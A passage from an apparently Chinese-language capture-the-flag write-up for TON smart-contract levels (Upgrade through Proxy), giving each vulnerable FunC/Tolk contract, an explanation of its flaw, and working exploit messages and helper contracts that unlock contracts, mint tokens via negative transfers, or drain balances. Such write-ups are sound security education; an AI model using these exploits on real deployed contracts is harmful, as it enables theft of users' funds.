        // receive "check" message
        if (isSliceBitsEqual(inMsgBody, "check")) {
            // send CheckLevelResult msg
            val msgBody: cell = beginCell()
                .storeUint(0x6df37b4d, 32)
                .storeRef(beginCell().storeSlice("upgrade").endCell())
                .storeBool(!ctxLocked)
            .endCell();
            val msg: builder = beginCell()
                .storeUint(0x18, 6)
                .storeSlice(senderAddress)
                .storeCoins(0)
                .storeUint(1, 1 + 4 + 4 + 64 + 32 + 1 + 1)
                .storeRef(msgBody);
                
            // send all the remaining value
            sendRawMessage(msg.endCell(), 64);
            return;
        }

        if (op == OP_UPGRADE) {
            val code: cell = inMsgBody.loadRef();
            setContractCodePostponed(code);
            return;
        }

        throw 0xffff; // if the message contains an op that is not known to this contract, we throw
    }

    // get methods are a means to conveniently read contract data using, for example, HTTP APIs
    // note that unlike in many other smart contract VMs, get methods cannot be called by other contracts

    get locked(): bool {
        loadData();
        return ctxLocked;
    }
    ```

- 向合约发送 `OP_UPGRADE` 消息可以更新合约的代码

    ```
    if (op == OP_UPGRADE) {
        val code: cell = inMsgBody.loadRef();
        setContractCodePostponed(code);
        return;
    }
    ```

- 可以在新代码中增加更新存储的逻辑

    ```
    if (op == 0x12345678) {
        setContractData(
            beginCell().storeSlice(ctxPlayer).storeUint(ctxNonce, 32).storeBool(false).endCell()
        );
        return;
    }
    ```

- 更新代码并解锁

    ```js
    export async function run(provider: NetworkProvider, args: string[]) {
        const ui = provider.ui();

        const address = Address.parse(args.length > 0 ? args[0] : await ui.input('old address'));

        const oldContract = provider.open(Upgrade.createFromAddress(address));

        await oldContract.send(
            provider.sender(),
            beginCell().storeUint(0xdbfaf817, 32).storeRef(await compile("Upgrade")).endCell(),
            toNano('0.05')
        );

        sleep(10000);

        await oldContract.send(
            provider.sender(),
            beginCell().storeUint(0x12345678, 32).endCell(),
            toNano('0.01')
        );
    }
    ```

## 13. ACCESS

> Unlock the contract below to complete this level.

??? note "Access"

    ```c
    #include "../imports/stdlib.fc";

    const op::unlock = "op::unlock"c; ;; create an opcode from string using the "c" prefix, this results in 0xf0fd50bb opcode in this case
    const op::change_owner = "op::change_owner"c; ;; create an opcode from string using the "c" prefix, this results in 0xf1eef33c opcode in this case
    const op::change_nonce = "op::change_nonce"c; ;; create an opcode from string using the "c" prefix, this results in 0x8caa87bd opcode in this case

    ;; storage variables

    global slice ctx_player;
    global int ctx_nonce;
    global slice ctx_owner;
    global int ctx_locked;

    ;; load_data populates storage variables using stored data
    () load_data() impure {
        var ds = get_data().begin_parse();

        ctx_player = ds~load_msg_addr();
        ctx_nonce = ds~load_uint(32);
        ctx_owner = ds~load_msg_addr();
        ctx_locked = ds~load_int(1);

        ds.end_parse();
    }

    ;; save_data stores storage variables as a cell into persistent storage
    () save_data() impure {
        set_data(
            begin_cell()
                .store_slice(ctx_player)
                .store_uint(ctx_nonce, 32)
                .store_slice(ctx_owner)
                .store_int(ctx_locked, 1)
            .end_cell()
        );
    }

    () check_owner(slice sender) {
        throw_unless(501, equal_slice_bits(sender, ctx_owner));
    }

    ;; recv_internal is the main function of the contract and is called when it receives a message from other contracts
    () recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {
        if (in_msg_body.slice_empty?()) { ;; ignore all empty messages
            return ();
        }

        slice cs = in_msg_full.begin_parse();
        int flags = cs~load_uint(4);
        if (flags & 1) { ;; ignore all bounced messages
            return ();
        }
        slice sender_address = cs~load_msg_addr();

        load_data(); ;; here we populate the storage variables

        int op = in_msg_body~load_uint(32); ;; by convention, the first 32 bits of incoming message is the op

        ;; receive "check" message
        if (equal_slice_bits(in_msg_body, "check")) {
            ;; send CheckLevelResult msg
            cell msg_body = begin_cell()
                .store_uint(0x6df37b4d, 32)
                .store_ref(begin_cell().store_slice("access").end_cell())
                .store_int(~ ctx_locked, 1)
            .end_cell();
            builder msg = begin_cell()
                .store_uint(0x18, 6)
                .store_slice(sender_address)
                .store_coins(0)
                .store_uint(1, 1 + 4 + 4 + 64 + 32 + 1 + 1)
                .store_ref(msg_body);
                
            ;; send all the remaining value
            send_raw_message(msg.end_cell(), 64);
            return ();
        }

        if (op == op::unlock) {
            ctx_locked = ~ equal_slice_bits(ctx_player, ctx_owner);
            save_data();
            return ();
        }

        if (op == op::change_owner) {
            check_owner(sender_address);
            throw_unless(502, ctx_nonce == 9999);
            ctx_owner = in_msg_body~load_msg_addr();
            save_data();
            return ();
        }

        if (op == op::change_nonce) {
            ctx_nonce = in_msg_body~load_uint(32);
            save_data();
            return ();
        }

        throw(0xffff); ;; if the message contains an op that is not known to this contract, we throw
    }

    ;; get methods are a means to conveniently read contract data using, for example, HTTP APIs
    ;; they are marked with method_id
    ;; note that unlike in many other smart contract VMs, get methods cannot be called by other contracts

    int nonce() method_id {
        load_data();
        return ctx_nonce;
    }

    slice owner() method_id {
        load_data();
        return ctx_owner;
    }

    int locked() method_id {
        load_data();
        return ctx_locked;
    }
    ```

- 解锁需要 `ctx_owner` 是 `ctx_player`

    ```c
    if (op == op::unlock) {
        ctx_locked = ~ equal_slice_bits(ctx_player, ctx_owner);
        save_data();
        return ();
    }
    ```

- 操作 `op::change_owner` 调用函数 `check_owner()` 检查调用者是否为 `ctx_owner`，但由于未使用 `impure` 标识符且没有检查函数调用的结果，该函数调用会在编译时被移除

    ```c
    () check_owner(slice sender) {
        throw_unless(501, equal_slice_bits(sender, ctx_owner));
    }
    ```

- 因此，先修改 `ctx_nonce` 再更新 `ctx_owner`，即可解锁

    ```js
    > await contract.send(player, beginCell().storeUint(0x8caa87bd, 32).storeUint(9999, 32).endCell(), toNano("0.01"));
    > await contract.send(player, beginCell().storeUint(0xf1eef33c, 32).storeAddress(player.address).endCell(), toNano("0.01"));
    > await contract.send(player, beginCell().storeUint(0xf0fd50bb, 32).endCell(), toNano("0.01"));
    ```

## 14. DONATE

> You will beat this level if you manage to reduce its balance to 0.

??? note "Donate"

    ```c
    #include "../imports/stdlib.fc";

    const donation_goal = 1000000000;
    const gas_consumption = 5000000; 

    const op::change_destination = "op::change_destination"c; ;; create an opcode from string using the "c" prefix, this results in 0xbaed25a6 opcode in this case
    const op::withdraw = "op::withdraw"c; ;; create an opcode from string using the "c" prefix, this results in 0xcb03bfaf opcode in this case
    const op::donate = "op::donate"c; ;; create an opcode from string using the "c" prefix, this results in 0x47bbe425 opcode in this case

    ;; storage variables

    global slice player;
    global int nonce;
    global slice owner;
    global slice destination;
    global int donations_count;

    ;; load_data populates storage variables using stored data
    () load_data() impure {
        var ds = get_data().begin_parse();

        player = ds~load_msg_addr();
        nonce = ds~load_uint(32);
        owner = ds~load_msg_addr();
        destination = ds~load_msg_addr();
        donations_count = ds~load_uint(32);

        ds.end_parse();
    }

    ;; save_data stores storage variables as a cell into persistent storage
    () save_data() impure {
        set_data(
            begin_cell()
                .store_slice(player)
                .store_uint(nonce, 32)
                .store_slice(owner)
                .store_slice(destination)
                .store_uint(donations_count, 32)
            .end_cell()
        );
    }

    ;; recv_internal is the main function of the contract and is called when it receives a message from other contracts
    () recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {
        if (in_msg_body.slice_empty?()) { ;; ignore all empty messages
            return ();
        }

        slice cs = in_msg_full.begin_parse();
        int flags = cs~load_uint(4);
        if (flags & 1) { ;; ignore all bounced messages
            return ();
        }
        slice sender_address = cs~load_msg_addr();

        load_data(); ;; here we populate the storage variables

        int op = in_msg_body~load_uint(32); ;; by convention, the first 32 bits of incoming message is the op

        ;; receive "check" message
        if (equal_slice_bits(in_msg_body, "check")) {
            ;; send CheckLevelResult msg
            cell msg_body = begin_cell()
                .store_uint(0x6df37b4d, 32)
                .store_ref(begin_cell().store_slice("donate").end_cell())
                .store_int(my_balance - msg_value == 0, 1)
            .end_cell();
            builder msg = begin_cell()
                .store_uint(0x18, 6)
                .store_slice(sender_address)
                .store_coins(0)
                .store_uint(1, 1 + 4 + 4 + 64 + 32 + 1 + 1)
                .store_ref(msg_body);
                
            ;; send all the remaining value
            send_raw_message(msg.end_cell(), 64);
            return ();
        }

        if (op == op::change_destination) {
            throw_unless(501, equal_slice_bits(sender_address, owner));
            var new_destination = in_msg_body~load_msg_addr();
            destination = new_destination;
            save_data();
            return ();
        }

        if (op == op::withdraw) {
            throw_unless(502, equal_slice_bits(sender_address, destination));
            builder msg = begin_cell()
                .store_uint(0x18, 6)
                .store_slice(destination)
                .store_coins(0)
                .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1);
            
            ;; send all the contract balance
            send_raw_message(msg.end_cell(), 128);
            return ();
        }

        if (op == op::donate) {
            throw_unless(503, my_balance - msg_value < donation_goal);

            if (my_balance > donation_goal) {
                var destination = in_msg_body~load_msg_addr();
                builder msg = begin_cell()
                    .store_uint(0x18, 6)
                    .store_slice(destination)
                    .store_coins(my_balance - donation_goal - gas_consumption)
                    .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1);
                
                send_raw_message(msg.end_cell(), 0);
            }

            donations_count += 1;
            save_data();
            return ();
        }

        throw(0xffff); ;; if the message contains an op that is not known to this contract, we throw
    }

    ;; get methods are a means to conveniently read contract data using, for example, HTTP APIs
    ;; they are marked with method_id
    ;; note that unlike in many other smart contract VMs, get methods cannot be called by other contracts

    slice _owner() method_id {
        load_data();
        return owner;
    }

    slice _destination() method_id {
        load_data();
        return destination;
    }

    int _donations_count() method_id {
        load_data();
        return donations_count;
    }

    int balance() method_id {
        [int value, _] = get_balance();
        return value;
    }
    ```

- 操作 `op::withdraw` 可以将合约所持有的所有 TON 都发送给调用者 `destination`
- 修改 `destination` 的操作 `op::change_destination` 只有 `owner` 可以调用
- 由于全局变量不能被重定义，当合约余额大于 `donation_goal` 时，操作 `op::donate` 实际上更新的是全局变量 `destination`，而不是其定义的本地变量

    ```c
    if (op == op::donate) {
        throw_unless(503, my_balance - msg_value < donation_goal);

        if (my_balance > donation_goal) {
            var destination = in_msg_body~load_msg_addr();
            builder msg = begin_cell()
                .store_uint(0x18, 6)
                .store_slice(destination)
                .store_coins(my_balance - donation_goal - gas_consumption)
                .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1);
            
            send_raw_message(msg.end_cell(), 0);
        }

        donations_count += 1;
        save_data();
        return ();
    }
    ```

- 捐款并设置 `destination`，随后发送 `op::withdraw` 消息

```js
> await contract.send(player, beginCell().storeUint(0x47bbe425, 32).storeAddress(player.address).endCell(), toNano(1));
> await contract.send(player, beginCell().storeUint(0xcb03bfaf, 32).endCell(), toNano("0.01"));
```

### References

- [Variable declaration](https://docs.ton.org/v3/documentation/smart-contracts/func/docs/statements#variable-declaration)

## 15. LOGICAL

> Unlock the contract below to complete this level.

??? note "Logical"

    ```
    // storage variables

    global ctxPlayer: slice;
    global ctxNonce: int;
    global ctxLocked: bool;
    global ctxPrevLogicalTime: int;
    global ctxLogicalTimeDiff: int;

    // loadData populates storage variables using stored data
    fun loadData() {
        var ds = getContractData().beginParse();

        ctxPlayer = ds.loadAddress();
        ctxNonce = ds.loadUint(32);
        ctxLocked = ds.loadBool();
        ctxPrevLogicalTime = ds.loadUint(64);
        ctxLogicalTimeDiff = ds.loadUint(32);

        ds.assertEndOfSlice();
    }

    // saveData stores storage variables as a cell into persistent storage
    fun saveData() {
        setContractData(
            beginCell()
                .storeSlice(ctxPlayer)
                .storeUint(ctxNonce, 32)
                .storeBool(ctxLocked)
                .storeUint(ctxPrevLogicalTime, 64)
                .storeUint(ctxLogicalTimeDiff, 32)
            .endCell()
        );
    }

    // onInternalMessage is the main function of the contract and is called when it receives a message from other contracts
    fun onInternalMessage(myBalance: int, msgValue: int, inMsgFull: cell, inMsgBody: slice) {
        if (inMsgBody.isEndOfSlice()) { // ignore all empty messages
            return;
        }

        var cs: slice = inMsgFull.beginParse();
        val flags: int = cs.loadUint(4);
        if (flags & 1) { // ignore all bounced messages
            return;
        }
        val senderAddress: slice = cs.loadAddress();

        loadData(); // here we populate the storage variables

        inMsgBody.skipBits(32); // by convention, the first 32 bits of incoming message is the op

        // receive "check" message
        if (isSliceBitsEqual(inMsgBody, "check")) {
            // send CheckLevelResult msg
            val msgBody: cell = beginCell()
                .storeUint(0x6df37b4d, 32)
                .storeRef(beginCell().storeSlice("logical").endCell())
                .storeBool(!ctxLocked)
            .endCell();
            val msg: builder = beginCell()
                .storeUint(0x18, 6)
                .storeSlice(senderAddress)
                .storeCoins(0)
                .storeUint(1, 1 + 4 + 4 + 64 + 32 + 1 + 1)
                .storeRef(msgBody);
                
            // send all the remaining value
            sendRawMessage(msg.endCell(), 64);
            return;
        }

        if (getLogicalTime() - ctxPrevLogicalTime == ctxLogicalTimeDiff) {
            ctxLocked = false;
        }
        ctxPrevLogicalTime = getLogicalTime();
        saveData();
    }

    // get methods are a means to conveniently read contract data using, for example, HTTP APIs
    // note that unlike in many other smart contract VMs, get methods cannot be called by other contracts

    get locked(): bool {
        loadData();
        return ctxLocked;
    }

    get prevLogicalTime(): int {
        loadData();
        return ctxPrevLogicalTime;
    }

    get logicalTimeDiff(): int {
        loadData();
        return ctxLogicalTimeDiff;
    }
    ```

- 当当前交易的逻辑时间和上一交易的逻辑时间之差为 `ctxLogicalTimeDiff` 时，可以解锁

    ```
    if (getLogicalTime() - ctxPrevLogicalTime == ctxLogicalTimeDiff) {
        ctxLocked = false;
    }
    ctxPrevLogicalTime = getLogicalTime();
    ```

- 获取 `ctxLogicalTimeDiff` 的值

    ```js
    > await contract.getLogicalTimeDiff();
    1n
    ```

- 由于要求逻辑时间差仅为 1，可以从同一个合约中发出两条消息

    ```js
    import "@stdlib/deploy";

    message Send {
        target: Address;
    }

    contract MultiMessageSender with Deployable {

        receive(msg: Send) {
            repeat(2) {
                send(SendParameters{
                    to: msg.target,
                    value: ton("0.008"),
                    mode: SendDefaultMode + SendPayGasSeparately,
                    body: beginCell().storeUint(0, 32).endCell()
                });
            }
        }
    }
    ```

## 16. SEED

> Unlock the contract below to complete this level.

??? note "Seed"

    ```
    const OP_UNLOCK = "op::unlock"c; // create an opcode from string using the "c" prefix, this results in 0xf0fd50bb opcode in this case

    // storage variables

    global ctxPlayer: slice;
    global ctxNonce: int;
    global ctxLocked: bool;
    global ctxSeed: int;

    // loadData populates storage variables using stored data
    fun loadData() {
        var ds = getContractData().beginParse();

        ctxPlayer = ds.loadAddress();
        ctxNonce = ds.loadUint(32);
        ctxLocked = ds.loadBool();
        ctxSeed = ds.loadUint(256);

        ds.assertEndOfSlice();
    }

    // saveData stores storage variables as a cell into persistent storage
    fun saveData() {
        setContractData(
            beginCell()
                .storeSlice(ctxPlayer)
                .storeUint(ctxNonce, 32)
                .storeBool(ctxLocked)
                .storeUint(ctxSeed, 256)
            .endCell()
        );
    }

    // onInternalMessage is the main function of the contract and is called when it receives a message from other contracts
    fun onInternalMessage(myBalance: int, msgValue: int, inMsgFull: cell, inMsgBody: slice) {
        if (inMsgBody.isEndOfSlice()) { // ignore all empty messages
            return;
        }

        var cs: slice = inMsgFull.beginParse();
        val flags: int = cs.loadUint(4);
        if (flags & 1) { // ignore all bounced messages
            return;
        }
        val senderAddress: slice = cs.loadAddress();

        loadData(); // here we populate the storage variables

        val op: int = inMsgBody.loadUint(32); // by convention, the first 32 bits of incoming message is the op

        // receive "check" message
        if (isSliceBitsEqual(inMsgBody, "check")) {
            // send CheckLevelResult msg
            val msgBody: cell = beginCell()
                .storeUint(0x6df37b4d, 32)
                .storeRef(beginCell().storeSlice("seed").endCell())
                .storeBool(!ctxLocked)
            .endCell();
            val msg: builder = beginCell()
                .storeUint(0x18, 6)
                .storeSlice(senderAddress)
                .storeCoins(0)
                .storeUint(1, 1 + 4 + 4 + 64 + 32 + 1 + 1)
                .storeRef(msgBody);
                
            // send all the remaining value
            sendRawMessage(msg.endCell(), 64);
            return;
        }

        if (op == OP_UNLOCK) {
            val guess: int = inMsgBody.loadUint(256);
            if (ctxSeed == 0) {
                ctxSeed = random();
            }
            randomSetSeed(ctxSeed);
            ctxSeed = random();
            if (guess == ctxSeed) {
                ctxLocked = false;
            }
            saveData();
            return;
        }

        throw 0xffff; // if the message contains an op that is not known to this contract, we throw
    }

    // get methods are a means to conveniently read contract data using, for example, HTTP APIs
    // note that unlike in many other smart contract VMs, get methods cannot be called by other contracts

    get locked(): bool {
        loadData();
        return ctxLocked;
    }

    get seed(): int {
        loadData();
        return ctxSeed;
    }
    ```

- 当 `ctxSeed` 不为 0 时，将直接设置 seed 并获取随机数作为下一个 seed

    ```
    if (op == OP_UNLOCK) {
        val guess: int = inMsgBody.loadUint(256);
        if (ctxSeed == 0) {
            ctxSeed = random();
        }
        randomSetSeed(ctxSeed);
        ctxSeed = random();
        if (guess == ctxSeed) {
            ctxLocked = false;
        }
        saveData();
        return;
    }
    ```

- 发送一条消息初始化 seed

    ```js
    > await contract.send(player, beginCell().storeUint(0xf0fd50bb, 32).storeUint(0, 256).endCell(), toNano("0.01"));
    ```

- 在已知 seed 的情况下，可以通过辅助合约获取随机的结果

    ```js
    import "@stdlib/deploy";

    message Random {
        prevSeed: Int as uint256;
        target: Address;
    }

    contract Guesser with Deployable {

        receive(msg: Random) {
            setSeed(msg.prevSeed);
            let guess: Int = nativeRandom();
            send(SendParameters{
                to: msg.target,
                value: ton("0.008"),
                mode: SendDefaultMode + SendPayGasSeparately,
                body: beginCell().storeUint(0xf0fd50bb, 32).storeUint(guess, 256).endCell()
            });
        }
    }
    ```

### References

- [Random number generation](https://docs.ton.org/v3/guidelines/smart-contracts/security/random-number-generation/)
- [nativeRandom](https://docs.tact-lang.org/ref/core-random/#nativerandom)

## 17. TOKEN

> You will beat this level if you manage to acquire tokens amount equivalent to total token supply.

??? note "Token"

    ```
    import "@stdlib/tvm-dicts"

    const OP_MINT = "op::mint"c; // create an opcode from string using the "c" prefix, this results in 0xecad15c4 opcode in this case
    const OP_TRANSFER = "op::transfer"c; // create an opcode from string using the "c" prefix, this results in 0x3ee943f1 opcode in this case

    // storage variables

    global ctxPlayer: slice;
    global ctxNonce: int;
    global ctxOwner: slice;
    global ctxBalances: cell;
    global ctxTotalSupply: int;

    // loadData populates storage variables using stored data
    fun loadData() {
        var ds = getContractData().beginParse();

        ctxPlayer = ds.loadAddress();
        ctxNonce = ds.loadUint(32);
        ctxOwner = ds.loadAddress();
        ctxBalances = ds.loadDict();
        ctxTotalSupply = ds.loadUint(256);

        ds.assertEndOfSlice();
    }

    // saveData stores storage variables as a cell into persistent storage
    fun saveData() {
        setContractData(
            beginCell()
                .storeSlice(ctxPlayer)
                .storeUint(ctxNonce, 32)
                .storeSlice(ctxOwner)
                .storeDict(ctxBalances)
                .storeUint(ctxTotalSupply, 256)
            .endCell()
        );
    }

    fun getBalance(balances: cell, account: slice): int {
        var (_, value: slice, _, isFound: bool) = balances.prefixDictGet(account.getRemainingBitsCount(), account);
        if (!isFound) {
            return 0;
        }
        return value.loadUint(256);
    }

    fun setBalance(mutate self: cell, account: slice, amount: int): void {
        // will throw if amount is negative
        val isSuccess: bool = self.prefixDictSet(account.getRemainingBitsCount(), account, beginCell().storeUint(amount, 256).endCell().beginParse());
        assert(isSuccess, 501);
    }

    fun mint(balances: cell, to: slice, amount: int): cell {
        var toBalance: int = getBalance(balances, to);

        toBalance += amount;
    
        balances.setBalance(to, toBalance);
        return balances;
    }

    fun transfer(balances: cell, from: slice, to: slice, amount: int): cell {
        var fromBalance: int = getBalance(balances, from);
        var toBalance: int = getBalance(balances, to);
    
        fromBalance -= amount;
        toBalance += amount;

        assert(fromBalance > 0, 502);
    
        balances.setBalance(from, fromBalance);
        balances.setBalance(to, toBalance);
        return balances;
    }

    // onInternalMessage is the main function of the contract and is called when it receives a message from other contracts
    fun onInternalMessage(myBalance: int, msgValue: int, inMsgFull: cell, inMsgBody: slice) {
        if (inMsgBody.isEndOfSlice()) { // ignore all empty messages
            return;
        }

        var cs: slice = inMsgFull.beginParse();
        val flags: int = cs.loadUint(4);
        if (flags & 1) { // ignore all bounced messages
            return;
        }
        val senderAddress: slice = cs.loadAddress();

        loadData(); // here we populate the storage variables

        val op: int = inMsgBody.loadUint(32); // by convention, the first 32 bits of incoming message is the op

        // receive "check" message
        if (isSliceBitsEqual(inMsgBody, "check")) {
            // send CheckLevelResult msg
            val msgBody: cell = beginCell()
                .storeUint(0x6df37b4d, 32)
                .storeRef(beginCell().storeSlice("token").endCell())
                .storeBool(getBalance(ctxBalances, ctxPlayer) == ctxTotalSupply)
            .endCell();
            val msg: builder = beginCell()
                .storeUint(0x18, 6)
                .storeSlice(senderAddress)
                .storeCoins(0)
                .storeUint(1, 1 + 4 + 4 + 64 + 32 + 1 + 1)
                .storeRef(msgBody);
                
            // send all the remaining value
            sendRawMessage(msg.endCell(), 64);
            return;
        }

        if (op == OP_MINT) {
            assert(isSliceBitsEqual(senderAddress, ctxOwner), 503);
            val to: slice = inMsgBody.loadAddress();
            val amount: int = inMsgBody.loadInt(256);
            ctxTotalSupply += amount;
            ctxBalances = mint(ctxBalances, to, amount);
            saveData();
            return;
        }

        if (op == OP_TRANSFER) {
            val to: slice = inMsgBody.loadAddress();
            val amount: int = inMsgBody.loadInt(256);
            ctxBalances = transfer(ctxBalances, senderAddress, to, amount);
            saveData();
            return;
        }

        throw 0xffff; // if the message contains an op that is not known to this contract, we throw
    }

    // get methods are a means to conveniently read contract data using, for example, HTTP APIs
    // note that unlike in many other smart contract VMs, get methods cannot be called by other contracts

    get owner(): slice {
        loadData();
        return ctxOwner;
    }

    get balanceOf(account: slice): int {
        loadData();
        return getBalance(ctxBalances, account);
    }

    get totalSupply(): int {
        loadData();
        return ctxTotalSupply;
    }
    ```

- 需要让代币余额与总供应量相同

    ```
    // send CheckLevelResult msg
    val msgBody: cell = beginCell()
        .storeUint(0x6df37b4d, 32)
        .storeRef(beginCell().storeSlice("token").endCell())
        .storeBool(getBalance(ctxBalances, ctxPlayer) == ctxTotalSupply)
    .endCell();
    ```

- 获取初始数据

    ```js
    > await contract.getTotalSupply();
    1000000n
    > await contract.getBalanceOf(player.address);
    0n
    ```

- 初始代币余额为 0。操作 `OP_TRANSFER` 使用 `loadInt()` 解析要转移的代币数量，即 `amount` 可以为负数，能够增加发送者的代币余额

    ```
    if (op == OP_TRANSFER) {
        val to: slice = inMsgBody.loadAddress();
        val amount: int = inMsgBody.loadInt(256);
        ctxBalances = transfer(ctxBalances, senderAddress, to, amount);
        saveData();
        return;
    }

    fun transfer(balances: cell, from: slice, to: slice, amount: int): cell {
        // ...
    
        fromBalance -= amount;
        toBalance += amount;

        assert(fromBalance > 0, 502);
    
        // ...
    }
    ```

- 进行代币转移

    ```js
    > await contract.send(player, beginCell().storeUint(0x3ee943f1, 32).storeAddress(contract.address).storeInt(-1000000n, 256).endCell(), toNano("0.02"));
    ```

## 18. JACKPOT

> You will beat this level if you manage to reduce its balance to 0.

??? note "Jackpot"

    ```c
    #include "../imports/stdlib.fc";

    ;; storage variables

    global slice ctx_player;
    global int ctx_nonce;
    global cell ctx_balances;

    ;; load_data populates storage variables using stored data
    () load_data() impure {
        var ds = get_data().begin_parse();

        ctx_player = ds~load_msg_addr();
        ctx_nonce = ds~load_uint(32);
        ctx_balances = ds~load_dict();

        ds.end_parse();
    }

    ;; save_data stores storage variables as a cell into persistent storage
    () save_data() impure {
        set_data(
            begin_cell()
                .store_slice(ctx_player)
                .store_uint(ctx_nonce, 32)
                .store_dict(ctx_balances)
            .end_cell()
        );
    }

    ;; recv_internal is the main function of the contract and is called when it receives a message from other contracts
    () recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {
        if (in_msg_body.slice_empty?()) { ;; ignore all empty messages
            return ();
        }

        slice cs = in_msg_full.begin_parse();
        int flags = cs~load_uint(4);
        if (flags & 1) { ;; ignore all bounced messages
            return ();
        }
        slice sender_address = cs~load_msg_addr();
        (int wc, int sender) = parse_std_addr(sender_address);
        throw_unless(501, wc == 0);

        load_data(); ;; here we populate the storage variables

        int op = in_msg_body~load_uint(32); ;; by convention, the first 32 bits of incoming message is the op

        if (equal_slice_bits(in_msg_body, "check")) { ;; receive "check" message
            ;; send CheckLevelResult msg
            cell msg_body = begin_cell()
                .store_uint(0x6df37b4d, 32)
                .store_ref(begin_cell().store_slice("jackpot").end_cell())
                .store_int(my_balance - msg_value == 0, 1)
            .end_cell();
            builder msg = begin_cell()
                .store_uint(0x18, 6)
                .store_slice(sender_address)
                .store_coins(0)
                .store_uint(1, 1 + 4 + 4 + 64 + 32 + 1 + 1)
                .store_ref(msg_body);
                
            ;; send all the remaining value
            send_raw_message(msg.end_cell(), 64);
            return ();
        }

        if (op == 0) { ;; deposit
            int fee = 10000000;
            int balance = max(msg_value - fee, 0);
            (_, slice old_balance_slice, int found?) = ctx_balances.udict_delete_get?(256, sender);
            if (found?) {
                balance += old_balance_slice~load_coins();
            }
            ctx_balances~udict_set_builder(256, sender, begin_cell().store_coins(balance));
            save_data();
            return ();
        }

        if (op == 1) { ;; withdraw
            (_, slice old_balance_slice, int found?) = ctx_balances.udict_delete_get?(256, sender);
            throw_unless(502, found?);
            int balance = old_balance_slice~load_coins();
            int withdraw_amount = in_msg_body~load_coins();
            throw_unless(503, balance >= withdraw_amount);
            balance -= withdraw_amount;
            if (balance > 0) {
                ctx_balances~udict_set_builder(256, sender, begin_cell().store_coins(balance));
            }
            var msg = begin_cell()
                .store_uint(0x18, 6)
                .store_slice(sender_address)
                .store_coins(withdraw_amount)
                .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
            .end_cell();
            send_raw_message(msg, 64 + 2);
            save_data();
            return ();
        }

        throw(0xffff); ;; if the message contains an op that is not known to this contract, we throw
    }

    ;; get methods are a means to conveniently read contract data using, for example, HTTP APIs
    ;; they are marked with method_id
    ;; note that unlike in many other smart contract VMs, get methods cannot be called by other contracts

    int balance_of(slice account_address) method_id {
        load_data();
        (_, int account) = parse_std_addr(account_address);
        (slice value, int found?) = ctx_balances.udict_get?(256, account);
        ifnot (found?) {
            return 0;
        }
        return value~load_coins();
    }

    int balance() method_id {
        [int value, _] = get_balance();
        return value;
    }
    ```

- 操作 `withdraw` 使用了非修改方法 `udict_delete_get?` 获取了旧的余额，但修改后的字典没有赋值给 `ctx_balances`。如果 `withdraw_amount` 恰好等于 `balance`，`ctx_balances` 将不会被更新

    ```c
    if (op == 1) { ;; withdraw
        (_, slice old_balance_slice, int found?) = ctx_balances.udict_delete_get?(256, sender);
        throw_unless(502, found?);
        int balance = old_balance_slice~load_coins();
        int withdraw_amount = in_msg_body~load_coins();
        throw_unless(503, balance >= withdraw_amount);
        balance -= withdraw_amount;
        if (balance > 0) {
            ctx_balances~udict_set_builder(256, sender, begin_cell().store_coins(balance));
        }
        ;; [...]
        save_data();
        return ();
    }
    ```

- 可以在一次 deposit 之后，进行多次 withdraw

    ```js
    > await contract.send(player, beginCell().storeUint(0, 32).endCell(), toNano("0.05"));
    > await contract.getBalanceOf(player.address);
    40000000n
    > await contract.send(player, beginCell().storeUint(1, 32).storeCoins(40000000n).endCell(), toNano("0.05"));
    // 根据合约余额决定接下来的 withdraw_amount
    > await contract.getBalance();
    1423502n
    > await contract.send(player, beginCell().storeUint(1, 32).storeCoins(1423482n).endCell(), toNano("0.05"));
    // 需要留一部分合约余额用于交 storage fee，否则转出消息会发送失败
    // https://testnet.tonviewer.com/transaction/f422227642e7cb91d4e730df9324b83905e724f19c6488d009480bbd0fde66b0
    ```

## 19. PROXY

> You will beat this level if you manage to disable this proxy contract.

??? note "Proxy"

    ```
    // storage variables

    global ctxPlayer: slice;
    global ctxNonce: int;
    global ctxOwner: slice;
    global ctxEnabled: bool;

    // loadData populates storage variables using stored data
    fun loadData() {
        var ds = getContractData().beginParse();

        ctxPlayer = ds.loadAddress();
        ctxNonce = ds.loadUint(32);
        ctxOwner = ds.loadAddress();
        ctxEnabled = ds.loadBool();

        ds.assertEndOfSlice();
    }

    // saveData stores storage variables as a cell into persistent storage
    fun saveData() {
        setContractData(
            beginCell()
                .storeSlice(ctxPlayer)
                .storeUint(ctxNonce, 32)
                .storeSlice(ctxOwner)
                .storeBool(ctxEnabled)
            .endCell()
        );
    }

    // onInternalMessage is the main function of the contract and is called when it receives a message from other contracts
    fun onInternalMessage(myBalance: int, msgValue: int, inMsgFull: cell, inMsgBody: slice) {
        if (inMsgBody.isEndOfSlice()) { // ignore all empty messages
            return;
        }

        var cs: slice = inMsgFull.beginParse();
        cs.skipBits(4);
        val senderAddress: slice = cs.loadAddress();

        loadData(); // here we populate the storage variables

        val op: int = inMsgBody.loadUint(32); // by convention, the first 32 bits of incoming message is the op

        // receive "check" message
        if (isSliceBitsEqual(inMsgBody, "check")) {
            // send CheckLevelResult msg
            val msgBody: cell = beginCell()
                .storeUint(0x6df37b4d, 32)
                .storeRef(beginCell().storeSlice("proxy").endCell())
                .storeBool(!ctxEnabled)
            .endCell();
            val msg: builder = beginCell()
                .storeUint(0x18, 6)
                .storeSlice(senderAddress)
                .storeCoins(0)
                .storeUint(1, 1 + 4 + 4 + 64 + 32 + 1 + 1)
                .storeRef(msgBody);
                
            // send all the remaining value
            sendRawMessage(msg.endCell(), 64);
            return;
        }

        if (op == 0) {
            assert(ctxEnabled, 501);
            val targetAddress: slice = inMsgBody.loadAddress();
            val msgBody: cell = inMsgBody.loadRef();
            val msg: builder = beginCell()
                .storeUint(0x18, 6)
                .storeSlice(targetAddress)
                .storeCoins(0)
                .storeUint(1, 1 + 4 + 4 + 64 + 32 + 1 + 1)
                .storeRef(msgBody);
                        
            // send all the remaining value
            sendRawMessage(msg.endCell(), 64);
        } else {
            assert(isSliceBitsEqual(senderAddress, ctxOwner), 502);
            ctxEnabled = inMsgBody.loadBool();
            saveData();
        }
    }

